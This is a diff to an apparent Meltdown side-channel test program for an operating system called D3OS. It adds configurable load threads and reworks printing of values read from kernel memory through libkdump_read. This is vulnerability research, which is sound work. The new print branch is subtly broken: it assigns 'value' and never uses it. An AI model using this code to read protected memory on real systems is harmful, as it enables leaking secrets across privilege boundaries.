@@ -368,6 +368,20 @@ impl TryFrom<String> for LoadThreadKind {
 	}
 }
 
+type LoadThreadFn = fn();
+
+impl From<LoadThreadKind> for Box<LoadThreadFn> {
+	fn from(value: LoadThreadKind) -> Box<LoadThreadFn> {
+		match value {
+			LoadThreadKind::PrintThread => Box::new(print_thread),
+			LoadThreadKind::NopThread => Box::new(nop_thread),
+			LoadThreadKind::YieldThread => Box::new(yield_thread),
+			LoadThreadKind::LoadThread => Box::new(load_thread),
+			LoadThreadKind::MemThread => Box::new(mem_thread),
+		}
+	}
+}
+
 fn print_help() {
 	println!("Meltdown vulnerability tester for D3OS.");
 	println!("This application copies a string into protected kernel memory using a syscall.");
@@ -463,10 +477,11 @@ pub fn main() {
 		}
 	}
 	
-	for i in 0..3 {
+	let load_thread_fn = *Box::<LoadThreadFn>::from(load_thread_kind);
+	for i in 0..load_threads {
 		// TODO: Find out why load threads are used in the original
 		// TODO: Do we really need load threads?
-		thread::create(nop_thread);
+		thread::create(load_thread_fn);
 	}
 	
 	println!("Current CPU time: {}", rdtsc());
@@ -504,8 +519,15 @@ pub fn main() {
 		unsafe {
 			pointer = SECRET.add(index);
 		}
-		let value = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
-		print!("{}", value as u8); // TODO: Find out why this only prints 1 when using load threads
+		let result = libkdump_read(&default_config, cache_miss_threshold, &mem, pointer);
+		
+		if print_charcodes {
+			let value = result as u8;
+		} else {
+			let value = result as u8 as char;
+		}
+		
+		print!("{}", result); // TODO: Find out why this only prints 1 when using load threads
 		/*unsafe {
 			println!("Got value at address {:?}: {} real: {}", pointer, value, *pointer);
 		}*/
